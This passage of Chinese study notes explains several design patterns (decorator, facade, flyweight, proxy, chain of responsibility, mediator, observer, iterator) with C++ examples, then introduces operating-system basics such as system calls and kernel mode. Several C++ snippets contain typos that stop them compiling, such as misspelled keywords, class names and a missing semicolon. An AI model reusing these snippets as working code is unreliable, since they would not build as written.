- 找出基本组件和可选层次的通用方法。 创建一个组件接口并在其中声明这些方法。
- 创建一个具体组件类， 并定义其基础行为。
- 创建装饰基类， 使用一个成员变量存储指向被封装对象的引用。 该成员变量必须被声明为组件接口类型， 从而能在运行时连接具体组件和装饰。 装饰基类必须将所有工作委派给被封装的对象。
- 确保所有类实现组件接口。
- 将装饰基类扩展为具体装饰。 具体装饰必须在调用父类方法 （总是委派给被封装对象） 之前或之后执行自身的行为。
- 客户端代码负责创建装饰并将其组合成客户端所需的形式。

#### 代码实现

例如：一个手机，允许为他添加特性，比如增加挂件，手机贴膜等。一种灵活的设计方式是，将手机嵌入到另一个对象中，有这个对象完成特性的添加，我们将这个嵌入的对象为装饰。

```C++
class Phone{
public:
	Phone(){}
	virutal ~Phone(){}
	virutal void ShowDecorate(){}
};

class iPhone: public Phone{
private:
	string m_name;
public:
	iPhome(String name): m_name(name){}
	~iPhone(){}
	void ShowDecorate(){cout << m_name << "的装饰" << endl;}
};

class NokiaPhone: public Phone{
private:
	string m_name;
public:
	NokiaPhone(string name): m_name(name){}
	~NokiaName(){}
	void ShowDecorate(){cout << m_name<< "的装饰" << endl;}
};

// 装饰类
class DecoratorPhone: public Phone{
private:
	Phone *m_phone;
public:
	DecoratorPhone(Phone *phone): m_phone(phone){}
	virtual void ShowDecorate(){m_phone->ShowDecorate();}
};

class DecoratorPhoneA: public DecoratorPhone{
public:
	DecoratorPhoneA(Phone *phone): DecoratorPhone(phone){}
	void ShowDecorate(){DecoratorPhone::ShowDecorate(); AddDecorate();}
private:
	void AddDecorate(){cout << "增加挂件" << endl;}
};

class DecoratePhoneB: public DecoratorPhone{
public:
	DecoratorPhoneB(Phone *phone): DecoratorPhone(phone){}
	void ShowDecorate(){DecoratorPhone::ShowDecorate(); AddDecorate();}
private:
	void AddDecorate(){cout << "屏幕贴膜" << endl;}
};

int main(){
    shared_ptr<Phone> phone1(new NokiaPhone("6300"));
    shared_ptr<Phone> dpa(new DecoratorPhoneA(phone1));	// 装饰，增加挂件
    shared_ptr<Phone> dpb(new DecoratorPhoneB(dpa));	// 装饰，屏幕贴膜
    dpb->ShowDecorate();
    return 0;
}
```

#### 优缺点

优点：

- 你无需创建新子类即可扩展对象的行为。
- 你可以在运行时添加或删除对象的功能。
- 你可以用多个装饰封装对象来组合几种行为。
-  *单一职责原则*。 你可以将实现了许多不同行为的一个大类拆分为多个较小的类。

缺点：

- 在封装器栈中删除特定封装器比较困难。
- 实现行为不受装饰栈顺序影响的装饰比较困难。
- 各层的初始化配置代码看上去可能会很糟糕。

### 外观模式（Facade）

**外观模式**是一种结构性设计模式，能为程序库、框架或者其他复杂类提供一个简单的接口。

#### 解决方案

外观类为包含许多活动部件的复杂子系统提供一个简单的接口。与直接调用子系统相比，外观提供的功能可能比较有限，但它却包含了客户端真正关心的功能。

如果你的程序需要与包含几十种功能的复杂库整合， 但只需使用其中非常少的功能， 那么使用外观模式会非常方便。

#### 外观模式结构

- **外观（Facade）**：提供了一种访问特定子系统功能的便捷方式。其了解如何重定向客户端请求，知晓如何操作一切活动部件。
- **创建附加外观（Additional Facade）**：可以避免多种不相关的功能都污染同一个外观，使其变成有一个复杂结构。客户端和其他外观都可以使用附加外观。
- **复杂子系统（Complext subsystem）**：由数十个不同对象构成。如果要用这些对象完成有意义的工作，必须深入了解子系统的实现细节。子系统类不会意识到外观的存在，他们在系统内运作并且相互之间可直接进行交互。
- **客户端（Client）**：使用外观代替对子系统对象的直接调用。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\facade.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **如果你需要一个指向复杂子系统的直接接口， 且该接口的功能有限， 则可以使用外观模式。**
  - 子系统通常会随着时间的推进变得越来越复杂。为了解决这个问题， 外观将会提供指向子系统中最常用功能的快捷方式， 能够满足客户端的大部分需求。
- **如果需要将子系统组织为多层结构， 可以使用外观。**
  - 创建外观来定义子系统中各层次的入口。 你可以要求子系统仅使用外观来进行交互， 以减少子系统之间的耦合。

#### 实现方式

- 考虑能否在现有子系统的基础上提供一个更简单的接口。 如果该接口能让客户端代码独立于众多子系统类， 那么你的方向就是正确的。
- 在一个新的外观类中声明并实现该接口。 外观应将客户端代码的调用重定向到子系统中的相应对象处。 如果客户端代码没有对子系统进行初始化， 也没有对其后续生命周期进行管理， 那么外观必须完成此类工作。
- 如果要充分发挥这一模式的优势， 你必须确保所有客户端代码仅通过外观来与子系统进行交互。 此后客户端代码将不会受到任何由子系统代码修改而造成的影响， 比如子系统升级后， 你只需修改外观中的代码即可。
- 如果外观变得过于臃肿， 你可以考虑将其部分行为抽取为一个新的专用外观类。

#### 代码实现

例子：编译器需要经过4个步骤：词法分析，语法分析，中间代码生成，机器码生成。对于这个系统就可以使用外观模式。

```c++
class Sacnner{
public:
	void Scan(){cout << "词法分析" << endl;}
};
class Parser{
public:
	void Parse(){cout << "语法分析" << endl;}
};
class GenMidCode{
public:
	void GenCode(){cout << "中间代码生成" << endl;}
};
class GenMachineCode{
public:
	void GenCode(){cout << "机器码生成" << endl;}
};

class Compile{
public:
	void Run(){
		Scanner scanner;
		Parser parser;
		GenMidCode genMidCode;
		GenMachineCode genMachineCode;
		scanner.Scan();
		parser.Parse();
		genMidCode.GenCode();
		genMachineCode.GenCode();
	}
};
```

#### 优缺点

优点：

- 可以让自己的代码独立于复杂子系统。

缺点：

- 外观可能称为程序中所有类都耦合的上帝对象（一个了解过多或者负责过多的对象）。

### 享元模式（Flyweight）

**享元模式**是一种结构型设计模式， 它摒弃了在每个对象中保存所有数据的方式， 通过共享多个对象所共有的相同状态， 让你能在有限的内存容量中载入更多对象。

#### 解决方案

对象的常量数据通常被称为内在状态，其位于对象中，其他对象只能读取但不能修改其数值。而数值的其他状态常常能被其他对象“从外部”改变，因此被称为外在状态。

享元模式建议不在对象中存储外在状态， 而是将其传递给依赖于它的一个特殊方法。 程序只在对象中保存内在状态， 以方便在不同情景下重用。 这些对象的区别仅在于其内在状态 （与外在状态相比， 内在状态的变体要少很多）， 因此你所需的对象数量会大大削减。

将仅存储内在状态的对象称为**享元**。

外在状态在大部分情况下，都会被移动到容器对象中，也就是我们应用享元模式前的聚合对象中。

为了能更方便的访问各种享元，可以创建一个工厂方法来管理已有享元对象的缓存池。

#### 享元模式结构

- **享元模式只是一种优化**。在应用该模式之前，要确定程序中存在于大量类似对象同时占用内存相关的内存消耗问题，并且确保该问题无法使用其他更好的方式来解决。
- **享元（Flyweight）**：包含原始对象中部分能在多个对象中共享的状态。同一个享元对象可在许多不同情境中使用。享元中存储的状态被称为“内在状态”。传递给享元方法的状态被称为“外在状态”。
- **情景（context）**：包含原始对象中各不相同的外在状态。情景与享元对象组合在一起就能表示原始对象的全部状态。
- 通常情况下，原始对象的行为会保留在享元类中。因此调用享元方法必须提供部分外在状态作为参数。但可以将行为移动到情景类中，然后将连入的享元作为单纯的数据对象。
- **客户端（Client）**：负责计算或者存储享元的外在状态。在客户端来看，享元是一种可在运行时进行配置的模板对象，具体的配置方式为向其方法中传入一些情景数据参数。
- **享元工厂（Flyweight Factory）**：会对已有享元的缓存池进行管理。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\cache.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **仅在程序必须支持大量对象且没有足够的内存容量时使用享元模式。**
- 应用该模式所获的收益大小取决于使用它的方式和情景，在下列情况中最有用：
  - 程序需要生成数量巨大的相似对象
  - 将耗尽目标设备的所有内存
  - 对象中包含可抽取且能在多个对象间共享的重复状态。

#### 实现方式

- 将需要改写为享元的类成员变量拆分为两个部分：
  - 内在状态： 包含不变的、 可在许多对象中重复使用的数据的成员变量。
  - 外在状态： 包含每个对象各自不同的情景数据的成员变量
- 保留类中表示内在状态的成员变量， 并将其属性设置为不可修改。 这些变量仅可在构造函数中获得初始数值。
- 找到所有使用外在状态成员变量的方法， 为在方法中所用的每个成员变量新建一个参数， 并使用该参数代替成员变量。
- 你可以有选择地创建工厂类来管理享元缓存池， 它负责在新建享元时检查已有的享元。 如果选择使用工厂， 客户端就只能通过工厂来请求享元， 它们需要将享元的内在状态作为参数传递给工厂。
- 客户端必须存储和计算外在状态 （情景） 的数值， 因为只有这样才能调用享元对象的方法。 为了使用方便， 外在状态和引用享元的成员变量可以移动到单独的情景类中。

#### 代码实现

例子：以树为例

```c++
class TreeType{
private:
    string m_name;
    string m_color;
    string m_texture;
public:
    TreeType(string name, string color, string texture): m_name(name), m_color(color), m_texture(texture){
        cout << "construct with " << name << " " << color << " " << texture << endl;
    }
    void draw(int x, int y){
            cout<< "TreeType Draw at (" << x << "," << y << ")" << endl;
    }
};

class TreeFactory{
public:
    map<string, TreeType> treeTypes;
    TreeType getTreeType(string name, string color, string texture){
        map<string, TreeType>::iterator typeIter = treeTypes.find(name + color + texture);
        if(typeIter == treeTypes.end()){
            TreeType type(name, color, texture);
            treeTypes.insert(make_pair(name+color+texture, type));
            return type;
        }
        return typeIter->second;
    }
};

class Tree{
private:
    int x, y;
    TreeType type;

public:
    Tree(int _x, int _y, TreeType _type) : x(_x), y(_y), type(_type){}
    void draw(){
        type.draw(x, y);
    }
};

void plantTrees(int x, int y, string name, string color, string texture, TreeFactory& treeFactory, vector<Tree>& trees){
    TreeType type = treeFactory.getTreeType(name, color, texture);
    Tree tree(x, y, type);
    trees.push_back(tree);
}
```

#### 优缺点

优点：

- 如果程序中有很多相似的对象，那么将可以节省大量内存

缺点：

- 可能需要牺牲执行速度来换取内存，因为每次调用享元方法时都需要重新计算部分情景数据
- 代码会变得复杂

### 代理模式（Proxy）

**代理模式**是一种结构型设计模式， 让你能够提供对象的替代品或其占位符。 代理控制着对于原对象的访问， 并允许在将请求提交给对象前后进行一些处理。

#### 解决方案

代理模式建议新建一个与原服务对象接口相同的代理类，然后更新应用将代理对象传递给素有原始对象客户端。代理类收到客户端请求后会创建实际的服务对象，并将所有工作委派给他。

比如代理将自己伪装成数据库对象，可以在客户端或者实际数据库对象不知情的情况下处理延迟初始化和缓存查询结果的工作。

#### 代理模式结构

- **服务接口（service interface）**：声明了服务接口，代理必须遵循该接口才能伪装成服务对象。
- **服务（service）**：提供了一些实用的业务逻辑
- **代理（Proxy）**：包含一个指向服务对象的引用成员变量。代理完成其任务后会将请求传毒给服务对象。
- **客户端（Client）**：能通过统一接口与服务或者代理进行交互。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\proxy.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- **延迟初始化（虚拟代理）。如果有一个偶尔使用的重量级服务对象，一致保持该对象余小宁会消耗系统资源时，可以使用代理模式。**
- **访问控制（保护代理）**。如果希望特定客户端使用服务对象，这里的对象可以是操作系统中非常重要的部分，而客户端则是已经启动的程序（包括恶意程序），此时可以使用代理模式。
- **本地执行远程服务（远程代理）**。是用于服务对象位于远程服务器上的情形。
- **记录日志请求（日志记录代理）**。是用于需要保存对于服务对象的请求历史记录时。代理可以向服务传递请求前进行记录。
- **智能引用**。可以在没有客户端使用某个重量级对象时历史销毁该对象。

#### 实现方式

- 如果没有现成的服务接口，需要创建一个接口来实现代理和服务对象的可交换性。
- 创建代理类，其中必须包含一个存储指向服务的引用的成员变量。
- 根据需求实现代理方法。
- 可以考虑新建一个构建方法来判断客户端可获取的是代理还是实际服务。
- 可以考虑为服务对象实现延迟初始化。

#### 代码实现

例如：一个可以在文档中嵌入图形对象的文档编辑器。有些图形的创建开销很大，因此可以创建一个图像代理，先不打开图形，需要打开的时候再打开

```
class Image{
public:
	Image(string name) : m_imageName(name){}
	virtual ~Image(){}
	virtual void Show(){}
protected:
	string m_imageName;
};
class BigImage: public Image{
public:
	BigImage(string name): Image(name){}
	~BigImage(){}
	void Show(){cout << "Show Big Image" << m_imageName << endl;}
};
class BigImageProxy: public Image{
private:
	BigImage *m_bigImage;
public:
	BigImageProxy(string name) : Image(name), m_bigImage(0){}
	~BigImageProxy(){delete m_bigImage;}
	void Show(){
		if(m_bigImage == NULL)
			m_bigImage = new BigImage(m_imageName);
		m_bigImage->Show();
	}
}
int main(){
	Image *image = new BigImageProxy("proxy.jpg");
	image->Show();
	delete image;
	return 0;
}
```

## 行为模式

### 责任链模式（职责链模式，Chain of Responsibility）

**责任链模式**是一种行为设计模式， 允许你将请求沿着处理者链进行发送。 收到请求后， 每个处理者均可对请求进行处理， 或将其传递给链上的下个处理者。

#### 解决方案

与许多其他行为设计模式一样， **责任链**会将特定行为转换为被称作*处理者*的独立对象。 

模式建议你将这些处理者连成一条链。 链上的每个处理者都有一个成员变量来保存对于下一处理者的引用。 除了处理请求外， 处理者还负责沿着链传递请求。 请求会在链上移动， 直至所有处理者都有机会对其进行处理。

处理者可以决定不再沿着链传递请求， 这可高效地取消所有后续处理步骤。

#### 责任链模式结构

- **处理者（Handler）**声明了所有具体处理者的通用接口。该接口通常仅包含单个方法用于请求处理，但有时其还会包含一个设置链上下个处理者的方法。
- **基础处理者（Base Handler）**：是一个可选的类，可以将所有处理者共同的样本代码放置在这里。
- **具体处理者（Concrete Handler）**：包含处理请求的实际代码，每个处理者接收到请求后，都必须决定是否进行处理，以及是否沿着链传递请求。处理者通常是独立且不可变的，需要通过构造函数一次性的获取所有必要的数据。
- **客户端（Client）**：可根据程序逻辑一次性或者动态的生成链。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\chainofresponsibility.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- 当程序需要使用不同方式处理不同种类请求，而且请求类型和顺序预先未知时，可以使用责任链模式。
- 迪桑必须按照顺序执行多个处理者时，可以使用该模式
- 如果所需处理者及其顺序必须在运行时可以进行改变，可以使用该模式

#### 实现方式

- 声明处理者接口并描述请求处理方法的签名。
- 为了在具体处理者中消除重复的样本代码， 你可以根据处理者接口创建抽象处理者基类。
- 依次创建具体处理者子类并实现其处理方法。 每个处理者在接收到请求后都必须做出两个决定：
  - 是否自行处理这个请求。
  - 是否将该请求沿着链进行传递。
- 客户端可以自行组装链， 或者从其他对象处获得预先组装好的链。 在后一种情况下， 你必须实现工厂类以根据配置或环境设置来创建链。
- 客户端可以触发链中的任意处理者， 而不仅仅是第一个。 请求将通过链进行传递， 直至某个处理者拒绝继续传递， 或者请求到达链尾。
- 由于链的动态性，客户端需要准备好以下情况：
  - 链中可能只有单个链接。
  - 部分请求可能无法到达链尾。
  - 其他请求可能直到链尾都未被处理。

#### 代码实现

例如：员工要求加薪，需要一层一层批准

```
class Manager{
protected:
	Manager *m_manager;
	string m_name;
public:
	Manager(Manager *manager, string name): m_manager(manager), m_name(name){}
	virtual void DealWithRequest(string name, int num){}
};
class CommonManager: public Manager{
public:
	CommonManager(Manager *manager, string name): Manager(manager, name){}
	void DealWithRequest(string name, int num){
		if(num < 500)
			cout << "commonmanager " << name << " accept " << "raises $" << num << endl;
		else{
			cout << "commonmanager cannot deal" << endl;
			m_manager->DealWithRequest(name, num);
		}
	}
};
class MajorManager: public Manager{
public:
	MajorManager(Manager *manager, string name): Manager(manager, name){}
	void DealWithRequest(string name, int num){
		if(num < 1000)
			cout << "majormanager " << name << " accept " << "raises $" << num << endl;
		else{
			cout << "majormanager cannot deal" << endl;
			m_manager->DealWithRequest(name, num);
		}
	}
};
class GeneralManager: public Manager{
public:
	GeneralManager(Manager *manager, string name): Manager(manager, name){}
	void DealWithRequest(string name, int num){
		cout << "generalmanager " << name << " accept " << "raises $" << num << endl;
	}
};

int main(){
	Manager *general = new GeneralManager(NULL, "A");
	Manager *major = new MajorManager(general, "B");
	Manager *common = new CommonManager(major, "C");
	common->DealWithRequest("D", 300);
	common->DealWithRequest("E", 1000);
	delete general;
	delete major;
	delete common;
	return 0;
}
```

#### 优缺点

优点：

- 可以控制请求处理的顺序
- *单一职责原则*。 你可对发起操作和执行操作的类进行解耦。
-  *开闭原则*。 你可以在不更改现有代码的情况下在程序中新增处理者。

缺点：

- 部分请求可能未被处理

### 中介者模式（Mediator）

**中介者模式**是一种行为设计模式， 能让你减少对象之间混乱无序的依赖关系。 该模式会限制对象之间的直接交互， 迫使它们通过一个中介者对象进行合作。

#### 解决方案

中介者模式建议你停止组件之间的直接交流并使其相互独立。 这些组件必须调用特殊的中介者对象， 通过中介者对象重定向调用行为， 以间接的方式进行合作。 最终， 组件仅依赖于一个中介者类， 无需与多个其他组件相耦合。

采用这种方式， 中介者模式让你能在单个中介者对象中封装多个对象间的复杂关系网。 类所拥有的依赖关系越少， 就越易于修改、 扩展或复用。

#### 中介者模式结构

- **组件（Component）**：各种包含业务逻辑的类，每个组件都有一个指向中介者的引用，该引用被声明为中介者接口类型。组件不知道中介者实际所属的类。因此可以通过将其连接到不同的中介者以使其能在其他程序中复用。
- **中介者（Mediator）**：接口声明了与组件交流的方法，但通常仅包括一个通知方法。组件可将任意上下文（包括自己的对象）作为该方法的参数，只有这样接收组件和发送者类之间才不会耦合。
- **具体中介者（Concrete Mediator）**：封装了多种组件间的关系。具体中介者通常会保存所有组件的引用并对其进行管理，甚至有时会对其生命周期进行管理。
- 组件并不知道其他组建的情况，如果组件内发生了重要事件，他只能通知中介者，中介者收到通知后能轻易地确定发送者，这足以判断接下来需要触发的组件了。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\mediator.png" alt="img" style="zoom:80%;" />
</div>

#### 应用场景

- 当一些对象和其他对象紧密耦合以致难以对其进行修改时，可以使用中介者模式
- 当组件过于依赖其他组件而无法在不同应用中复用时，可以使用中介者模式
- 如果为了能在不同情景下复用一些基本行为，导致需要被迫创建大量组件子类时，可以使用中介者模式

#### 实现方式

- 找到一组当前紧密耦合， 且提供其独立性能带来更大好处的类
- 声明中介者接口并描述中介者和各种组件之间所需的交流接口。 
- 实现具体中介者类。 
- 可以更进一步让中介者负责组件对象的创建和销毁。 
- 组件必须保存对于中介者对象的引用。 该连接通常在组件的构造函数中建立， 该函数会将中介者对象作为参数传递。
- 修改组件代码， 使其可调用中介者的通知方法， 而非其他组件的方法。 然后将调用其他组件的代码抽取到中介者类中， 并在中介者接收到该组件通知时执行这些代码。

#### 代码实现

例如：租房为例，如果没有房屋中介，那么房客要自己找房东，房东要自己找房客。

```c++
class Mediator;
class Person{
portected:
	Mediator *m_mediator;
public:
	virtual void SetMediator(Mediator *mediator){}
	virtual void SendMessage(string msg){}
	virtual void GetMessage(string msg){}
};
class Mediator{
public:
	virtual void Send(string msg, Person *person){}
	virtual void SetA(Person *A){}
	virtual void SetB(Person *B){}
};
class Renter: public Person{
public:
	void SetMediator(Mediator *mediator){m_mediator = mediator;}
	void SendMessage(string msg){m_mediator->Send(msg, this);}
	void GetMessage(string msg){cout << "renter get msg" << endl;}
};
class Landlord: public Person{
public:
	void SetMediator(Mediator *mediator){m_mediator = mediator;}
	void SendMessage(string msg){m_mediator->Send(msg, this);}
	void GetMessage(string msg){cout << "landlord get msg" << endl;}
};
class HouseMediator: public Mediator{
private:
	Person *m_A;
	Person *m_B;
public:
	HouseMediator(): m_A(NULL), m_B(NULL){}
	void SetA(Person *A){m_A = A;}
	void SetB(Person *B){m_B = B;}
	void Send(string msg, Person *person){
		if(person == m_A)
			m_B->GetMessage(msg);
		else
			m_A->GetMessage(msg);
	}
};
```

#### 优缺点

优点：

- *单一职责原则*。 你可以将多个组件间的交流抽取到同一位置， 使其更易于理解和维护。
-  *开闭原则*。 你无需修改实际组件就能增加新的中介者。
-  你可以减轻应用中多个组件间的耦合情况。
-  你可以更方便地复用各个组件。

缺点：

- 一段时候后，中介者 可能会演化为上帝对象。

### 观察者模式（Observer）

**观察者模式**是一种行为设计模式， 允许你定义一种订阅机制， 可在对象事件发生时通知多个 “观察” 该对象的其他对象。

#### 解决方案

拥有一些值得关注的状态的对象通常被称为*目标*， 由于它要将自身的状态改变通知给其他对象， 我们也将其称为*发布者* （publisher）。 所有希望关注发布者状态变化的其他对象被称为*订阅者* （subscribers）。

观察者模式建议为发布者类添加订阅机制，让每个对象都能订阅或者取消订阅发布者消息流。

实际上，该机制包括：1，一个用于存储订阅者对象引用的列表成员变量；2，几个用于添加或者删除该列表中订阅者的公有方法。

#### 观察者模式结构

- **发布者（Publisher）**：会向其他对象发送值得关注的事件。
- 当新事件发生时，发送者会遍历订阅列表并调用每个订阅者对象的通知方法，该方法是在订阅者接口中声明的。
- **订阅者（Subscriber）**：接口声明了通知接口。在绝大多数情况下，该接口仅包含一个更新方法。该方法可以拥有多个参数，使发布者能在更新时传递事件的详细参数。
- **具体订阅者（Concrete Subscriber）**：可以执行一些操作来回应发布者的通知。
- 订阅者通常需要一些上下文信息来正确的处理更新，因此发布这通常会将一些上下文数据作为通知方法的参数进行传递。
- **客户端（Client）**：分别创建发布者和订阅者对象，然后为订阅者注册发布者更新。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\others\mediator.png" alt="img" style="zoom:80%;" />
</div>



#### 应用场景

- 当一个对象状态的改变需要改变其他对象，或者实际对象是事先未知的或者动态变化的时，可以使用观察者模式。
- 当应用中的一些对象必须观察其他对象时，可以使用观察者模式。但仅能在有限时间内或者特定情况下使用。

#### 实现方式

- 仔细检查你的业务逻辑， 试着将其拆分为两个部分： 独立于其他代码的核心功能将作为发布者； 其他代码则将转化为一组订阅类。
- 声明订阅者接口。 该接口至少应声明一个 `update`方法。
- 声明发布者接口并定义一些接口来在列表中添加和删除订阅对象。 记住发布者必须仅通过订阅者接口与它们进行交互。
- 确定存放实际订阅列表的位置并实现订阅方法。
- 创建具体发布者类。 
- 在具体订阅者类中实现通知更新的方法。
- 客户端必须生成所需的全部订阅者， 并在相应的发布者处完成注册工作。

#### 代码实现

例如：博主和读者的问题

```c++
class Observer{
public:
	Observer(){}
	virtual ~Observer(){}
	virutal void Update(){}
};
class Blog{
public:
	Blog(){}
	~Blog(){}
	void Attach(Observer *observer){m_observers.push_back(observer);}
	void Remove(Observer *observer){m_observers.remove(observer);}
	void Notify(){
		list<Observer*>::iterator iter = m_observers.begin();
		for(; iter != m_observers.end(); iter++)
			(*iter)->Update();
	}
	virtual void SetStatus(string s){m_status = s;}
	virtual string GetStatus(){return m_status;}
private:
	list<Observer*> m_observers;
protected:
	stdring m_status;
};
class BlogCSDN: public Blog{
private:
	string m_name;
public:
	BlogCSDN(string name): m_name(name){}
	~BlogCSDN(){}
	void SetStatus(string s){m_status="CSDN message: "+m_name+s;}
	string GetStatus(){return m_status;}
};
class ObserverBlog: public Observer{
private:
	string m_name;
	Blog *m_blog;
public:
	ObserverBlog(string name, Bolg *blog): m_name(name), m_blog(blog){}
	~ObserverBolg(){}
	void Update(){
		string status = m_blog->GetStatus();
		cout << m_name << "--------" << status << endl;
	}
};
```

#### 优缺点

优点：

- *开闭原则*。 你无需修改发布者代码就能引入新的订阅者类 （如果是发布者接口则可轻松引入发布者类）。
-  你可以在运行时建立对象之间的联系。

缺点：

- 订阅者的通知顺序是随机的。

### 迭代器模式（Iterator）

迭代器模式是一种行为设计模式，让你能在不暴露集合底层表现形式（列表、栈和树等）的情况下遍历集合中所有的元素。

#### 解决方案

迭代器模式的主要思想就是将集合的遍历行为抽取为单独的迭代器模式。

#### 迭代器模式结构

![迭代器设计模式的结构](..\assets\post\others\iterator.png)

- **迭代器**接口声明了遍历集合所需的操作：获取下一个元素，获取当前位置和重新开始迭代等
- **具体迭代器**实现了遍历集合的一种特定算法。迭代器对象必须跟踪自身遍历的进度。这使得多个迭代器客户相互独立的遍历同一个集合。
- **集合**接口声明一个或者多个方法来获取于集合兼容的迭代器，请注意，返回方法的类型必须被声明为迭代器接口，因此具体集合可以返回各种 不同种类的迭代器。
- **具体集合**会在客户端请求迭代器时返回一个特定的具体迭代器类实体。
- **客户端**通过集合和迭代器的接口与两者进行交互。这样一个客户端无需与具体类进行耦合，允许同一个客户端代码使用各种不同的集合和迭代器。

#### 应用场景

- 当集合背后为复杂的数据结构，并且希望对客户端隐藏其复杂性时（出于使用便利性或者安全性考虑），可以使用迭代器模型
- 使用该模式可以减少程序中重复的代码
- 如果希望代码能够遍历不同的甚至是无法预知的数据机构，可以使用迭代器模式

#### 实现方式

- 声明迭代器接口，该接口必须提供至少一个方法来获取集合中的下个元素。但为了使用方便，还可以使用方便，还可以添加一些其他方法。
- 声明集合接口并描述一个获取迭代器的方法。其返回值必须是迭代器接口。
- 为希望使用迭代器进行遍历的集合实现具体迭代器类。迭代器对象必须与单个集合实体链接。链接关系通常通过迭代器的构造函数建立
- 在你的集合类中实现集合接口。主要思想是针对特定集合为客户端代码提供创建迭代器的快捷方式。
- 检查客户端代码，使用迭代器替换所有集合遍历函数。

#### 优缺点

- 单一职责原则。通过将体积庞大的遍历算法代码抽取为独立的类，可以对客户端代码和集合进行整理
- 开闭原则。可以实现新型的集合和迭代器并将其传递给现有代码，无需修改现有代码
- 可以并行遍历同一集合，因为每个迭代器对象都包含其自身的遍历状态

缺点：

- 如果程序只与简单的集合进行交互，该模式可能矫枉过正
- 对于某些特殊的集合，使用迭代器可能比直接遍历的效率低。

# 操作系统基础

## 基本特征

### 并发和并行

- 并发是指宏观上在一段时间内能同时运行多个程序，而并行是指在同一时刻可以同时运行多个指令
- 操作系统通过引入进程和线程，使得程序能够并发运行
- 并行需要硬件支持，如多流水线、多核处理器或者分布式计算系统

### 共享

- 共享是指系统中的资源可以被多个并发进程共同使用
- 共享的方式有两种：**互斥共享和同时共享**
- 互斥共享的资源称为临界资源；例如打印机等，在同一时刻只允许一个进程访问，需要用同步机制来实现互斥访问

### 虚拟

- 虚拟技术把一个物理实体转换为多个逻辑实体
- 虚拟技术主要有两种：时（时间）分复用技术和空（空间）分复用技术
- 多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占用处理器，每次只执行一小个时间片并快速切换
- 虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间的页被映射到物理内存，地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行**页面置换算法**，将该页置换到内存中

### 异步

- 异步指进程不是一次性执行完毕，而是走走停停，以不可知的速度向前推进

## 基本功能

- **进程管理**：进程控制、进程同步、进程通信、死锁处理、处理机调度等
- **内存管理**：内存分配、地址映射、内存保护与共享、虚拟内存等
- **文件管理**：文件存储空间的管理、目录管理、文件读写管理和保护等
- **设备管理**：完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率，主要包括缓冲管理、设备分配、设备处理、虚拟设备等

## 系统调用（内核态）

如果一个进程在用户态需要使用内核态功能，就进行系统调用从而陷入内核态，之后由操作系统代为完成。

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-02-10\systemcall.png" alt="img" style="zoom:60%;" />
</div>


- 工作流程为：
  - 用户态程序将一些数据值放在寄存器中，或者使用参数创建一个栈帧(stack frame), 以此表明需要操作系统提供的服务
  - 用户态程序执行陷阱指令（Trap Instruction，系统调用在CPU中的实现）
  - CPU切换到内核态, 并跳到位于内存指定位置的指令, 这些指令是操作系统的一部分, 他们具有内存保护, 不可被用户态程序访问
  - 这些指令称之为陷阱(trap)或者系统调用处理器(system call handler). 他们会读取程序放入内存的数据参数, 并执行程序请求的服务
  - 系统调用完成后, 操作系统会重置CPU为用户态并返回系统调用的结果
- Linux的系统调用功能主要有：
  - 进程控制：`fork();exit();wait()`
  - 进程通信：`pipe();shmget();mmap()`
  - 文件操作：`open();read();write()`
  - 设备操作：`ioctl();read();write()`
  - 信息维护：`getpid();alarm();sleep()`
  - 安全：`chmod();umask();chown()`

### 用户态和内核态

- 内核态：CPU可以访问内存的所有数据，包括外围设备，CPU也可以将自己从一个程序切换到另一个程序
- 用户态：只能受限的访问内存，且不允许访问外围设备，占用CPU的能力被剥夺，CPU资源可以被其他程序获取
- 切换的三种方式：**系统调用**（用户进程主动）、中断（被动）、外围设备中断（被动）
  - 中断：当CPU在用户态下运行时发生一些没有预知的异常，这会触发由当前运行进程切换到处理此异常的内核相关进程中，也就是切换到内核态，比如缺页异常
  - 外围设备中断：当外围设备完成用户请求操作后，会向CPU发出相应的中断信号，这时CPU会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换
- 用户态切换到内核态的步骤：
  - 从当前进程的描述符中提取其内核栈的`ss0`和`esp0`信息
  - 使用`ss0`和`esp0`指向的内核栈将当前进程的`cs,eip,eflags,ss,esp`信息保存起来，这个过程也完成了用户栈到内核栈的切换过程，同时保存了被暂停执行的程序的下一条指令
  - 将先前由中断向量检索得到的中断处理程序的`cs,eip`信息装入相应的寄存器，开始执行中断处理程序，这时就转到了内核态的程序执行了

### 中断分类

- **外中断**：由 CPU 执行指令以外的事件引起，如 I/O 完成中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等
- **异常**：由 CPU 执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等
- **陷入**：用户程序使用系统调用

## 内核分类

### 大内核

- 大内核是将操作系统功能作为一个紧密结合的整体放到内核
- 由于各模块共享信息，因此有很高的性能

### 微内核

- 由于操作系统不断复杂，因此将一部分操作系统功能移出内核，从而降低内核的复杂性。移出的部分根据分层的原则划分成若干服务，相互独立
- 在微内核结构下，操作系统被划分成小的、定义良好的模块，只有微内核这一个模块运行在内核态，其余模块运行在用户态
- 因为需要频繁地在用户态和核心态之间进行切换，所以会有一定的性能损失

<div class="image-wrapper" style="text-align: center">
<img src="..\assets\post\2020-02-10\microkernelArchitecture.png" alt="img" style="zoom:70%;" />
</div>

# 操作系统进程与线程

## 进程与线程

- **进程是资源分配的基本单位**；进程控制块 (Process Control Block, PCB) 描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作

